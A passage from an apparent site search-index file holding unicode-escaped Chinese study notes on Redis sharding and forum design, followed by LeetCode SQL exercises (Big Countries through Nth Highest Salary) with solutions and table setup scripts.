F0C\u8FD9\u79CD\u65B9\u6CD5\u5728\u89E3\u51B3\u67D0\u4E9B\u95EE\u9898\u65F6\u53EF\u4EE5\u83B7\u5F97\u7EBF\u6027\u7EA7\u522B\u7684\u6027\u80FD\u63D0\u5347\u3002
\u5047\u8BBE\u6709 4 \u4E2A Redis \u5B9E\u4F8B R0\uFF0CR1\uFF0CR2\uFF0CR3\uFF0C\u8FD8\u6709\u5F88\u591A\u8868\u793A\u7528\u6237\u7684\u952E user:1\uFF0Cuser:2\uFF0C... \uFF0C\u6709\u4E0D\u540C\u7684\u65B9\u5F0F\u6765\u9009\u62E9\u4E00\u4E2A\u6307\u5B9A\u7684\u952E\u5B58\u50A8\u5728\u54EA\u4E2A\u5B9E\u4F8B\u4E2D\u3002 \u6700\u7B80\u5355\u7684\u65B9\u5F0F\u662F\u8303\u56F4\u5206\u7247\uFF0C\u4F8B\u5982\u7528\u6237 id \u4ECE 0~1000 \u7684\u5B58\u50A8\u5230\u5B9E\u4F8B R0 \u4E2D\uFF0C\u7528\u6237 id \u4ECE 1001~2000 \u7684\u5B58\u50A8\u5230\u5B9E\u4F8B R1 \u4E2D\uFF0C\u7B49\u7B49\u3002\u4F46\u662F\u8FD9\u6837\u9700\u8981\u7EF4\u62A4\u4E00\u5F20\u6620\u5C04\u8303\u56F4\u8868\uFF0C\u7EF4\u62A4\u64CD\u4F5C\u4EE3\u4EF7\u5F88\u9AD8\u3002
\u8FD8\u6709\u4E00\u79CD\u65B9\u5F0F\u662F\u54C8\u5E0C\u5206\u7247\uFF0C\u4F7F\u7528 CRC32 \u54C8\u5E0C\u51FD\u6570\u5C06\u952E\u8F6C\u6362\u4E3A\u4E00\u4E2A\u6570\u5B57\uFF0C\u518D\u5BF9\u5B9E\u4F8B\u6570\u91CF\u6C42\u6A21\u5C31\u80FD\u77E5\u9053\u5E94\u8BE5\u5B58\u50A8\u7684\u5B9E\u4F8B\u3002 \u6839\u636E\u6267\u884C\u5206\u7247\u7684\u4F4D\u7F6E\uFF0C\u53EF\u4EE5\u5206\u4E3A\u4E09\u79CD\u5206\u7247\u65B9\u5F0F\uFF1A \u5BA2\u6237\u7AEF\u5206\u7247\uFF1A\u5BA2\u6237\u7AEF\u4F7F\u7528\u4E00\u81F4\u6027\u54C8\u5E0C\u7B49\u7B97\u6CD5\u51B3\u5B9A\u952E\u5E94\u5F53\u5206\u5E03\u5230\u54EA\u4E2A\u8282\u70B9\u3002
\u4EE3\u7406\u5206\u7247\uFF1A\u5C06\u5BA2\u6237\u7AEF\u8BF7\u6C42\u53D1\u9001\u5230\u4EE3\u7406\u4E0A\uFF0C\u7531\u4EE3\u7406\u8F6C\u53D1\u8BF7\u6C42\u5230\u6B63\u786E\u7684\u8282\u70B9\u4E0A\u3002
\u670D\u52A1\u5668\u5206\u7247\uFF1ARedis Cluster\u3002`},{header:"\u5341\u56DB\u3001\u4E00\u4E2A\u7B80\u5355\u7684\u8BBA\u575B\u7CFB\u7EDF\u5206\u6790",slug:"\u5341\u56DB\u3001\u4E00\u4E2A\u7B80\u5355\u7684\u8BBA\u575B\u7CFB\u7EDF\u5206\u6790",content:`\u8BE5\u8BBA\u575B\u7CFB\u7EDF\u529F\u80FD\u5982\u4E0B\uFF1A \u53EF\u4EE5\u53D1\u5E03\u6587\u7AE0\uFF1B
\u53EF\u4EE5\u5BF9\u6587\u7AE0\u8FDB\u884C\u70B9\u8D5E\uFF1B
\u5728\u9996\u9875\u53EF\u4EE5\u6309\u6587\u7AE0\u7684\u53D1\u5E03\u65F6\u95F4\u6216\u8005\u6587\u7AE0\u7684\u70B9\u8D5E\u6570\u8FDB\u884C\u6392\u5E8F\u663E\u793A\u3002`},{header:"\u6587\u7AE0\u4FE1\u606F",slug:"\u6587\u7AE0\u4FE1\u606F",content:`\u6587\u7AE0\u5305\u62EC\u6807\u9898\u3001\u4F5C\u8005\u3001\u8D5E\u6570\u7B49\u4FE1\u606F\uFF0C\u5728\u5173\u7CFB\u578B\u6570\u636E\u5E93\u4E2D\u5F88\u5BB9\u6613\u6784\u5EFA\u4E00\u5F20\u8868\u6765\u5B58\u50A8\u8FD9\u4E9B\u4FE1\u606F\uFF0C\u5728 Redis \u4E2D\u53EF\u4EE5\u4F7F\u7528 HASH \u6765\u5B58\u50A8\u6BCF\u79CD\u4FE1\u606F\u4EE5\u53CA\u5176\u5BF9\u5E94\u7684\u503C\u7684\u6620\u5C04\u3002
Redis \u6CA1\u6709\u5173\u7CFB\u578B\u6570\u636E\u5E93\u4E2D\u7684\u8868\u8FD9\u4E00\u6982\u5FF5\u6765\u5C06\u540C\u79CD\u7C7B\u578B\u7684\u6570\u636E\u5B58\u653E\u5728\u4E00\u8D77\uFF0C\u800C\u662F\u4F7F\u7528\u547D\u540D\u7A7A\u95F4\u7684\u65B9\u5F0F\u6765\u5B9E\u73B0\u8FD9\u4E00\u529F\u80FD\u3002\u952E\u540D\u7684\u524D\u9762\u90E8\u5206\u5B58\u50A8\u547D\u540D\u7A7A\u95F4\uFF0C\u540E\u9762\u90E8\u5206\u7684\u5185\u5BB9\u5B58\u50A8 ID\uFF0C\u901A\u5E38\u4F7F\u7528 : \u6765\u8FDB\u884C\u5206\u9694\u3002\u4F8B\u5982\u4E0B\u9762\u7684 HASH \u7684\u952E\u540D\u4E3A article:92617\uFF0C\u5176\u4E2D article \u4E3A\u547D\u540D\u7A7A\u95F4\uFF0CID \u4E3A 92617\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c54de21-e2ff-402e-bc42-4037de1c1592.png" width="400)`},{header:"\u70B9\u8D5E\u529F\u80FD",slug:"\u70B9\u8D5E\u529F\u80FD",content:`\u5F53\u6709\u7528\u6237\u4E3A\u4E00\u7BC7\u6587\u7AE0\u70B9\u8D5E\u65F6\uFF0C\u9664\u4E86\u8981\u5BF9\u8BE5\u6587\u7AE0\u7684 votes \u5B57\u6BB5\u8FDB\u884C\u52A0 1 \u64CD\u4F5C\uFF0C\u8FD8\u5FC5\u987B\u8BB0\u5F55\u8BE5\u7528\u6237\u5DF2\u7ECF\u5BF9\u8BE5\u6587\u7AE0\u8FDB\u884C\u4E86\u70B9\u8D5E\uFF0C\u9632\u6B62\u7528\u6237\u70B9\u8D5E\u6B21\u6570\u8D85\u8FC7 1\u3002\u53EF\u4EE5\u5EFA\u7ACB\u6587\u7AE0\u7684\u5DF2\u6295\u7968\u7528\u6237\u96C6\u5408\u6765\u8FDB\u884C\u8BB0\u5F55\u3002
\u4E3A\u4E86\u8282\u7EA6\u5185\u5B58\uFF0C\u89C4\u5B9A\u4E00\u7BC7\u6587\u7AE0\u53D1\u5E03\u6EE1\u4E00\u5468\u4E4B\u540E\uFF0C\u5C31\u4E0D\u80FD\u518D\u5BF9\u5B83\u8FDB\u884C\u6295\u7968\uFF0C\u800C\u6587\u7AE0\u7684\u5DF2\u6295\u7968\u96C6\u5408\u4E5F\u4F1A\u88AB\u5220\u9664\uFF0C\u53EF\u4EE5\u4E3A\u6587\u7AE0\u7684\u5DF2\u6295\u7968\u96C6\u5408\u8BBE\u7F6E\u4E00\u4E2A\u4E00\u5468\u7684\u8FC7\u671F\u65F6\u95F4\u5C31\u80FD\u5B9E\u73B0\u8FD9\u4E2A\u89C4\u5B9A\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/485fdf34-ccf8-4185-97c6-17374ee719a0.png" width="400)`},{header:"\u5BF9\u6587\u7AE0\u8FDB\u884C\u6392\u5E8F",slug:"\u5BF9\u6587\u7AE0\u8FDB\u884C\u6392\u5E8F",content:`\u4E3A\u4E86\u6309\u53D1\u5E03\u65F6\u95F4\u548C\u70B9\u8D5E\u6570\u8FDB\u884C\u6392\u5E8F\uFF0C\u53EF\u4EE5\u5EFA\u7ACB\u4E00\u4E2A\u6587\u7AE0\u53D1\u5E03\u65F6\u95F4\u7684\u6709\u5E8F\u96C6\u5408\u548C\u4E00\u4E2A\u6587\u7AE0\u70B9\u8D5E\u6570\u7684\u6709\u5E8F\u96C6\u5408\u3002\uFF08\u4E0B\u56FE\u4E2D\u7684 score \u5C31\u662F\u8FD9\u91CC\u6240\u8BF4\u7684\u70B9\u8D5E\u6570\uFF1B\u4E0B\u9762\u6240\u793A\u7684\u6709\u5E8F\u96C6\u5408\u5206\u503C\u5E76\u4E0D\u76F4\u63A5\u662F\u65F6\u95F4\u548C\u70B9\u8D5E\u6570\uFF0C\u800C\u662F\u6839\u636E\u65F6\u95F4\u548C\u70B9\u8D5E\u6570\u95F4\u63A5\u8BA1\u7B97\u51FA\u6765\u7684\uFF09
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f7d170a3-e446-4a64-ac2d-cb95028f81a8.png" width="800)`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013.
\u9EC4\u5065\u5B8F. Redis \u8BBE\u8BA1\u4E0E\u5B9E\u73B0 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2014.
REDIS IN ACTION
Skip Lists: Done Right
\u8BBA\u8FF0 Redis \u548C Memcached \u7684\u5DEE\u5F02
Redis 3.0 \u4E2D\u6587\u7248- \u5206\u7247
Redis \u5E94\u7528\u573A\u666F
Using Redis as an LRU cache`}]},{path:"/java/SQL%20%E7%BB%83%E4%B9%A0.html",title:"SQL \u7EC3\u4E60",pathLocale:"/",contents:[{header:"SQL \u7EC3\u4E60",slug:"sql-\u7EC3\u4E60",content:`SQL \u7EC3\u4E60 595. Big Countries
627. Swap Salary
620. Not Boring Movies
596. Classes More Than 5 Students
182. Duplicate Emails
196. Delete Duplicate Emails
175. Combine Two Tables
181. Employees Earning More Than Their Managers
183. Customers Who Never Order
184. Department Highest Salary
176. Second Highest Salary
177. Nth Highest Salary
178. Rank Scores
180. Consecutive Numbers
626. Exchange Seats`},{header:"595. Big Countries",slug:"_595-big-countries",content:"https://leetcode.com/problems/big-countries/description/"},{header:"Description",slug:"description",content:`+-----------------+------------+------------+--------------+---------------+
| name | continent | area | population | gdp |
+-----------------+------------+------------+--------------+---------------+
| Afghanistan | Asia | 652230 | 25500100 | 20343000 |
| Albania | Europe | 28748 | 2831741 | 12960000 |
| Algeria | Africa | 2381741 | 37100000 | 188681000 |
| Andorra | Europe | 468 | 78115 | 3712000 |
| Angola | Africa | 1246700 | 20609294 | 100990000 |
+-----------------+------------+------------+--------------+---------------+
\u67E5\u627E\u9762\u79EF\u8D85\u8FC7 3,000,000 \u6216\u8005\u4EBA\u53E3\u6570\u8D85\u8FC7 25,000,000 \u7684\u56FD\u5BB6\u3002
+--------------+-------------+--------------+
| name | population | area |
+--------------+-------------+--------------+
| Afghanistan | 25500100 | 652230 |
| Algeria | 37100000 | 2381741 |
+--------------+-------------+--------------+`},{header:"Solution",slug:"solution",content:`SELECT name, population, area
FROM World
WHERE area > 3000000 OR population > 25000000;`},{header:"SQL Schema",slug:"sql-schema",content:`SQL Schema \u7528\u4E8E\u5728\u672C\u5730\u73AF\u5883\u4E0B\u521B\u5EFA\u8868\u7ED3\u6784\u5E76\u5BFC\u5165\u6570\u636E\uFF0C\u4ECE\u800C\u65B9\u4FBF\u5728\u672C\u5730\u73AF\u5883\u8C03\u8BD5\u3002
DROP TABLE
IF EXISTS World;
CREATE TABLE World ( NAME VARCHAR ( 255 ), continent VARCHAR ( 255 ), area INT, population INT, gdp INT );
INSERT INTO World ( NAME, continent, area, population, gdp )
VALUES ( 'Afghanistan', 'Asia', '652230', '25500100', '203430000' ), ( 'Albania', 'Europe', '28748', '2831741', '129600000' ), ( 'Algeria', 'Africa', '2381741', '37100000', '1886810000' ), ( 'Andorra', 'Europe', '468', '78115', '37120000' ), ( 'Angola', 'Africa', '1246700', '20609294', '1009900000' );`},{header:"627. Swap Salary",slug:"_627-swap-salary",content:"https://leetcode.com/problems/swap-salary/description/"},{header:"Description",slug:"description-1",content:`| id | name | sex | salary |
|----|------|-----|--------|
| 1 | A | m | 2500 |
| 2 | B | f | 1500 |
| 3 | C | m | 5500 |
| 4 | D | f | 500 |
\u53EA\u7528\u4E00\u4E2A SQL \u67E5\u8BE2\uFF0C\u5C06 sex \u5B57\u6BB5\u53CD\u8F6C\u3002
| id | name | sex | salary |
|----|------|-----|--------|
| 1 | A | f | 2500 |
| 2 | B | m | 1500 |
| 3 | C | f | 5500 |
| 4 | D | m | 500 |`},{header:"Solution",slug:"solution-1",content:`\u4E24\u4E2A\u76F8\u7B49\u7684\u6570\u5F02\u6216\u7684\u7ED3\u679C\u4E3A 0\uFF0C\u800C 0 \u4E0E\u4EFB\u4F55\u4E00\u4E2A\u6570\u5F02\u6216\u7684\u7ED3\u679C\u4E3A\u8FD9\u4E2A\u6570\u3002
sex \u5B57\u6BB5\u53EA\u6709\u4E24\u4E2A\u53D6\u503C\uFF1A'f' \u548C 'm'\uFF0C\u5E76\u4E14\u6709\u4EE5\u4E0B\u89C4\u5F8B\uFF1A
'f' ^ ('m' ^ 'f') = 'm' ^ ('f' ^ 'f') = 'm'
'm' ^ ('m' ^ 'f') = 'f' ^ ('m' ^ 'm') = 'f'
\u56E0\u6B64\u5C06 sex \u5B57\u6BB5\u548C 'm' ^ 'f' \u8FDB\u884C\u5F02\u6216\u64CD\u4F5C\uFF0C\u6700\u540E\u5C31\u80FD\u53CD\u8F6C sex \u5B57\u6BB5\u3002
UPDATE salary
SET sex = CHAR ( ASCII(sex) ^ ASCII( 'm' ) ^ ASCII( 'f' ) );`},{header:"SQL Schema",slug:"sql-schema-1",content:`DROP TABLE
IF EXISTS salary;
CREATE TABLE salary ( id INT, NAME VARCHAR ( 100 ), sex CHAR ( 1 ), salary INT );
INSERT INTO salary ( id, NAME, sex, salary )
VALUES ( '1', 'A', 'm', '2500' ), ( '2', 'B', 'f', '1500' ), ( '3', 'C', 'm', '5500' ), ( '4', 'D', 'f', '500' );`},{header:"620. Not Boring Movies",slug:"_620-not-boring-movies",content:"https://leetcode.com/problems/not-boring-movies/description/"},{header:"Description",slug:"description-2",content:`+---------+-----------+--------------+-----------+
| id | movie | description | rating |
+---------+-----------+--------------+-----------+
| 1 | War | great 3D | 8.9 |
| 2 | Science | fiction | 8.5 |
| 3 | irish | boring | 6.2 |
| 4 | Ice song | Fantacy | 8.6 |
| 5 | House card| Interesting| 9.1 |
+---------+-----------+--------------+-----------+
\u67E5\u627E id \u4E3A\u5947\u6570\uFF0C\u5E76\u4E14 description \u4E0D\u662F boring \u7684\u7535\u5F71\uFF0C\u6309 rating \u964D\u5E8F\u3002
+---------+-----------+--------------+-----------+
| id | movie | description | rating |
+---------+-----------+--------------+-----------+
| 5 | House card| Interesting| 9.1 |
| 1 | War | great 3D | 8.9 |
+---------+-----------+--------------+-----------+`},{header:"Solution",slug:"solution-2",content:`SELECT *
FROM cinema
WHERE id % 2 = 1 AND description != 'boring'
ORDER BY rating DESC;`},{header:"SQL Schema",slug:"sql-schema-2",content:`DROP TABLE
IF EXISTS cinema;
CREATE TABLE cinema ( id INT, movie VARCHAR ( 255 ), description VARCHAR ( 255 ), rating FLOAT ( 2, 1 ) );
INSERT INTO cinema ( id, movie, description, rating )
VALUES ( 1, 'War', 'great 3D', 8.9 ), ( 2, 'Science', 'fiction', 8.5 ), ( 3, 'irish', 'boring', 6.2 ), ( 4, 'Ice song', 'Fantacy', 8.6 ), ( 5, 'House card', 'Interesting', 9.1 );`},{header:"596. Classes More Than 5 Students",slug:"_596-classes-more-than-5-students",content:"https://leetcode.com/problems/classes-more-than-5-students/description/"},{header:"Description",slug:"description-3",content:`+---------+------------+
| student | class |
+---------+------------+
| A | Math |
| B | English |
| C | Math |
| D | Biology |
| E | Math |
| F | Computer |
| G | Math |
| H | Math |
| I | Math |
+---------+------------+
\u67E5\u627E\u6709\u4E94\u540D\u53CA\u4EE5\u4E0A student \u7684 class\u3002
+---------+
| class |
+---------+
| Math |
+---------+`},{header:"Solution",slug:"solution-3",content:`\u5BF9 class \u5217\u8FDB\u884C\u5206\u7EC4\u4E4B\u540E\uFF0C\u518D\u4F7F\u7528 count \u6C47\u603B\u51FD\u6570\u7EDF\u8BA1\u6BCF\u4E2A\u5206\u7EC4\u7684\u8BB0\u5F55\u4E2A\u6570\uFF0C\u4E4B\u540E\u4F7F\u7528 HAVING \u8FDB\u884C\u7B5B\u9009\u3002HAVING \u9488\u5BF9\u5206\u7EC4\u8FDB\u884C\u7B5B\u9009\uFF0C\u800C WHERE \u9488\u5BF9\u6BCF\u4E2A\u8BB0\u5F55\uFF08\u884C\uFF09\u8FDB\u884C\u7B5B\u9009\u3002
SELECT class
FROM courses
GROUP BY class
HAVING count( DISTINCT student ) >= 5;`},{header:"SQL Schema",slug:"sql-schema-3",content:`DROP TABLE
IF EXISTS courses;
CREATE TABLE courses ( student VARCHAR ( 255 ), class VARCHAR ( 255 ) );
INSERT INTO courses ( student, class )
VALUES ( 'A', 'Math' ), ( 'B', 'English' ), ( 'C', 'Math' ), ( 'D', 'Biology' ), ( 'E', 'Math' ), ( 'F', 'Computer' ), ( 'G', 'Math' ), ( 'H', 'Math' ), ( 'I', 'Math' );`},{header:"182. Duplicate Emails",slug:"_182-duplicate-emails",content:"https://leetcode.com/problems/duplicate-emails/description/"},{header:"Description",slug:"description-4",content:`\u90AE\u4EF6\u5730\u5740\u8868\uFF1A
+----+---------+
| Id | Email |
+----+---------+
| 1 | a@b.com |
| 2 | c@d.com |
| 3 | a@b.com |
+----+---------+
\u67E5\u627E\u91CD\u590D\u7684\u90AE\u4EF6\u5730\u5740\uFF1A
+---------+
| Email |
+---------+
| a@b.com |
+---------+`},{header:"Solution",slug:"solution-4",content:`\u5BF9 Email \u8FDB\u884C\u5206\u7EC4\uFF0C\u5982\u679C\u5E76\u4F7F\u7528 COUNT \u8FDB\u884C\u8BA1\u6570\u7EDF\u8BA1\uFF0C\u7ED3\u679C\u5927\u4E8E\u7B49\u4E8E 2 \u7684\u8868\u793A Email \u91CD\u590D\u3002
SELECT Email
FROM Person
GROUP BY Email
HAVING COUNT( * ) >= 2;`},{header:"SQL Schema",slug:"sql-schema-4",content:`DROP TABLE
IF EXISTS Person;
CREATE TABLE Person ( Id INT, Email VARCHAR ( 255 ) );
INSERT INTO Person ( Id, Email )
VALUES ( 1, 'a@b.com' ), ( 2, 'c@d.com' ), ( 3, 'a@b.com' );`},{header:"196. Delete Duplicate Emails",slug:"_196-delete-duplicate-emails",content:"https://leetcode.com/problems/delete-duplicate-emails/description/"},{header:"Description",slug:"description-5",content:`\u90AE\u4EF6\u5730\u5740\u8868\uFF1A
+----+---------+
| Id | Email |
+----+---------+
| 1 | john@example.com |
| 2 | bob@example.com |
| 3 | john@example.com |
+----+---------+
\u5220\u9664\u91CD\u590D\u7684\u90AE\u4EF6\u5730\u5740\uFF1A
+----+------------------+
| Id | Email |
+----+------------------+
| 1 | john@example.com |
| 2 | bob@example.com |
+----+------------------+`},{header:"Solution",slug:"solution-5",content:`\u53EA\u4FDD\u7559\u76F8\u540C Email \u4E2D Id \u6700\u5C0F\u7684\u90A3\u4E00\u4E2A\uFF0C\u7136\u540E\u5220\u9664\u5176\u5B83\u7684\u3002
\u8FDE\u63A5\u67E5\u8BE2\uFF1A
DELETE p1
FROM Person p1, Person p2
WHERE p1.Email = p2.Email AND p1.Id > p2.Id
\u5B50\u67E5\u8BE2\uFF1A
DELETE
FROM Person
WHERE id NOT IN ( SELECT id FROM ( SELECT min( id ) AS id FROM Person GROUP BY email ) AS m );
\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\u4E0A\u8FF0\u89E3\u6CD5\u989D\u5916\u5D4C\u5957\u4E86\u4E00\u4E2A SELECT \u8BED\u53E5\uFF0C\u5982\u679C\u4E0D\u8FD9\u4E48\u505A\uFF0C\u4F1A\u51FA\u73B0\u9519\u8BEF\uFF1AYou can't specify target table 'Person' for update in FROM clause\u3002\u4EE5\u4E0B\u6F14\u793A\u4E86\u8FD9\u79CD\u9519\u8BEF\u89E3\u6CD5\u3002
DELETE
FROM Person
WHERE id NOT IN ( SELECT min( id ) AS id FROM Person GROUP BY email );
\u53C2\u8003\uFF1ApMySQL Error 1093 - Can't specify target table for update in FROM clause`},{header:"SQL Schema",slug:"sql-schema-5",content:"\u4E0E 182 \u76F8\u540C\u3002"},{header:"175. Combine Two Tables",slug:"_175-combine-two-tables",content:"https://leetcode.com/problems/combine-two-tables/description/"},{header:"Description",slug:"description-6",content:`Person \u8868\uFF1A
+-------------+---------+
| Column Name | Type |
+-------------+---------+
| PersonId | int |
| FirstName | varchar |
| LastName | varchar |
+-------------+---------+
PersonId is the primary key column for this table.
Address \u8868\uFF1A
+-------------+---------+
| Column Name | Type |
+-------------+---------+
| AddressId | int |
| PersonId | int |
| City | varchar |
| State | varchar |
+-------------+---------+
AddressId is the primary key column for this table.
\u67E5\u627E FirstName, LastName, City, State \u6570\u636E\uFF0C\u800C\u4E0D\u7BA1\u4E00\u4E2A\u7528\u6237\u6709\u6CA1\u6709\u586B\u5730\u5740\u4FE1\u606F\u3002`},{header:"Solution",slug:"solution-6",content:`\u6D89\u53CA\u5230 Person \u548C Address \u4E24\u4E2A\u8868\uFF0C\u5728\u5BF9\u8FD9\u4E24\u4E2A\u8868\u6267\u884C\u8FDE\u63A5\u64CD\u4F5C\u65F6\uFF0C\u56E0\u4E3A\u8981\u4FDD\u7559 Person \u8868\u4E2D\u7684\u4FE1\u606F\uFF0C\u5373\u4F7F\u5728 Address \u8868\u4E2D\u6CA1\u6709\u5173\u8054\u7684\u4FE1\u606F\u4E5F\u8981\u4FDD\u7559\u3002\u6B64\u65F6\u53EF\u4EE5\u7528\u5DE6\u5916\u8FDE\u63A5\uFF0C\u5C06 Person \u8868\u653E\u5728 LEFT JOIN \u7684\u5DE6\u8FB9\u3002
SELECT FirstName, LastName, City, State
FROM Person P LEFT JOIN Address A ON P.PersonId = A.PersonId;`},{header:"SQL Schema",slug:"sql-schema-6",content:`DROP TABLE
IF EXISTS Person;
CREATE TABLE Person ( PersonId INT, FirstName VARCHAR ( 255 ), LastName VARCHAR ( 255 ) );
DROP TABLE
IF EXISTS Address;
CREATE TABLE Address ( AddressId INT, PersonId INT, City VARCHAR ( 255 ), State VARCHAR ( 255 ) );
INSERT INTO Person ( PersonId, LastName, FirstName )
VALUES ( 1, 'Wang', 'Allen' );
INSERT INTO Address ( AddressId, PersonId, City, State )
VALUES ( 1, 2, 'New York City', 'New York' );`},{header:"181. Employees Earning More Than Their Managers",slug:"_181-employees-earning-more-than-their-managers",content:"https://leetcode.com/problems/employees-earning-more-than-their-managers/description/"},{header:"Description",slug:"description-7",content:`Employee \u8868\uFF1A
+----+-------+--------+-----------+
| Id | Name | Salary | ManagerId |
+----+-------+--------+-----------+
| 1 | Joe | 70000 | 3 |
| 2 | Henry | 80000 | 4 |
| 3 | Sam | 60000 | NULL |
| 4 | Max | 90000 | NULL |
+----+-------+--------+-----------+
\u67E5\u627E\u85AA\u8D44\u5927\u4E8E\u5176\u7ECF\u7406\u85AA\u8D44\u7684\u5458\u5DE5\u4FE1\u606F\u3002`},{header:"Solution",slug:"solution-7",content:`SELECT E1.NAME AS Employee
FROM Employee E1 INNER JOIN Employee E2 ON E1.ManagerId = E2.Id AND E1.Salary > E2.Salary;`},{header:"SQL Schema",slug:"sql-schema-7",content:`DROP TABLE
IF EXISTS Employee;
CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, ManagerId INT );
INSERT INTO Employee ( Id, NAME, Salary, ManagerId )
VALUES ( 1, 'Joe', 70000, 3 ), ( 2, 'Henry', 80000, 4 ), ( 3, 'Sam', 60000, NULL ), ( 4, 'Max', 90000, NULL );`},{header:"183. Customers Who Never Order",slug:"_183-customers-who-never-order",content:"https://leetcode.com/problems/customers-who-never-order/description/"},{header:"Description",slug:"description-8",content:`Customers \u8868\uFF1A
+----+-------+
| Id | Name |
+----+-------+
| 1 | Joe |
| 2 | Henry |
| 3 | Sam |
| 4 | Max |
+----+-------+
Orders \u8868\uFF1A
+----+------------+
| Id | CustomerId |
+----+------------+
| 1 | 3 |
| 2 | 1 |
+----+------------+
\u67E5\u627E\u6CA1\u6709\u8BA2\u5355\u7684\u987E\u5BA2\u4FE1\u606F\uFF1A
+-----------+
| Customers |
+-----------+
| Henry |
| Max |
+-----------+`},{header:"Solution",slug:"solution-8",content:`\u5DE6\u5916\u94FE\u63A5
SELECT C.Name AS Customers
FROM Customers C LEFT JOIN Orders O ON C.Id = O.CustomerId
WHERE O.CustomerId IS NULL;
\u5B50\u67E5\u8BE2
SELECT Name AS Customers
FROM Customers
WHERE Id NOT IN ( SELECT CustomerId FROM Orders );`},{header:"SQL Schema",slug:"sql-schema-8",content:`DROP TABLE
IF EXISTS Customers;
CREATE TABLE Customers ( Id INT, NAME VARCHAR ( 255 ) );
DROP TABLE
IF EXISTS Orders;
CREATE TABLE Orders ( Id INT, CustomerId INT );
INSERT INTO Customers ( Id, NAME )
VALUES ( 1, 'Joe' ), ( 2, 'Henry' ), ( 3, 'Sam' ), ( 4, 'Max' );
INSERT INTO Orders ( Id, CustomerId )
VALUES ( 1, 3 ), ( 2, 1 );`},{header:"184. Department Highest Salary",slug:"_184-department-highest-salary",content:"https://leetcode.com/problems/department-highest-salary/description/"},{header:"Description",slug:"description-9",content:`Employee \u8868\uFF1A
+----+-------+--------+--------------+
| Id | Name | Salary | DepartmentId |
+----+-------+--------+--------------+
| 1 | Joe | 70000 | 1 |
| 2 | Henry | 80000 | 2 |
| 3 | Sam | 60000 | 2 |
| 4 | Max | 90000 | 1 |
+----+-------+--------+--------------+
Department \u8868\uFF1A
+----+----------+
| Id | Name |
+----+----------+
| 1 | IT |
| 2 | Sales |
+----+----------+
\u67E5\u627E\u4E00\u4E2A Department \u4E2D\u6536\u5165\u6700\u9AD8\u8005\u7684\u4FE1\u606F\uFF1A
+------------+----------+--------+
| Department | Employee | Salary |
+------------+----------+--------+
| IT | Max | 90000 |
| Sales | Henry | 80000 |
+------------+----------+--------+`},{header:"Solution",slug:"solution-9",content:`\u521B\u5EFA\u4E00\u4E2A\u4E34\u65F6\u8868\uFF0C\u5305\u542B\u4E86\u90E8\u95E8\u5458\u5DE5\u7684\u6700\u5927\u85AA\u8D44\u3002\u53EF\u4EE5\u5BF9\u90E8\u95E8\u8FDB\u884C\u5206\u7EC4\uFF0C\u7136\u540E\u4F7F\u7528 MAX() \u6C47\u603B\u51FD\u6570\u53D6\u5F97\u6700\u5927\u85AA\u8D44\u3002
\u4E4B\u540E\u4F7F\u7528\u8FDE\u63A5\u627E\u5230\u4E00\u4E2A\u90E8\u95E8\u4E2D\u85AA\u8D44\u7B49\u4E8E\u4E34\u65F6\u8868\u4E2D\u6700\u5927\u85AA\u8D44\u7684\u5458\u5DE5\u3002
SELECT D.NAME Department, E.NAME Employee, E.Salary
FROM Employee E, Department D, ( SELECT DepartmentId, MAX( Salary ) Salary FROM Employee GROUP BY DepartmentId ) M
WHERE E.DepartmentId = D.Id AND E.DepartmentId = M.DepartmentId AND E.Salary = M.Salary;`},{header:"SQL Schema",slug:"sql-schema-9",content:`DROP TABLE IF EXISTS Employee;
CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, DepartmentId INT );
DROP TABLE IF EXISTS Department;
CREATE TABLE Department ( Id INT, NAME VARCHAR ( 255 ) );
INSERT INTO Employee ( Id, NAME, Salary, DepartmentId )
VALUES ( 1, 'Joe', 70000, 1 ), ( 2, 'Henry', 80000, 2 ), ( 3, 'Sam', 60000, 2 ), ( 4, 'Max', 90000, 1 );
INSERT INTO Department ( Id, NAME )
VALUES ( 1, 'IT' ), ( 2, 'Sales' );`},{header:"176. Second Highest Salary",slug:"_176-second-highest-salary",content:"https://leetcode.com/problems/second-highest-salary/description/"},{header:"Description",slug:"description-10",content:`+----+--------+
| Id | Salary |
+----+--------+
| 1 | 100 |
| 2 | 200 |
| 3 | 300 |
+----+--------+
\u67E5\u627E\u5DE5\u8D44\u7B2C\u4E8C\u9AD8\u7684\u5458\u5DE5\u3002
+---------------------+
| SecondHighestSalary |
+---------------------+
| 200 |
+---------------------+
\u6CA1\u6709\u627E\u5230\u8FD4\u56DE null \u800C\u4E0D\u662F\u4E0D\u8FD4\u56DE\u6570\u636E\u3002`},{header:"Solution",slug:"solution-10",content:`\u4E3A\u4E86\u5728\u6CA1\u6709\u67E5\u627E\u5230\u6570\u636E\u65F6\u8FD4\u56DE null\uFF0C\u9700\u8981\u5728\u67E5\u8BE2\u7ED3\u679C\u5916\u9762\u518D\u5957\u4E00\u5C42 SELECT\u3002
SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT 1, 1 ) SecondHighestSalary;`},{header:"SQL Schema",slug:"sql-schema-10",content:`DROP TABLE
IF EXISTS Employee;
CREATE TABLE Employee ( Id INT, Salary INT );
INSERT INTO Employee ( Id, Salary )
VALUES ( 1, 100 ), ( 2, 200 ), ( 3, 300 );`},{header:"177. Nth Highest Salary",slug:"_177-nth-highest-salary",content:""},{header:"Description",slug:"description-11",content:"\u67E5\u627E\u5DE5\u8D44\u7B2C N \u9AD8\u7684\u5458\u5DE5\u3002"},{header:"Solution",slug:"solution-11",content:`CREATE FUNCTION getNthHighestSalary ( N INT ) RETURNS INT BEGIN SET N = N - 1;
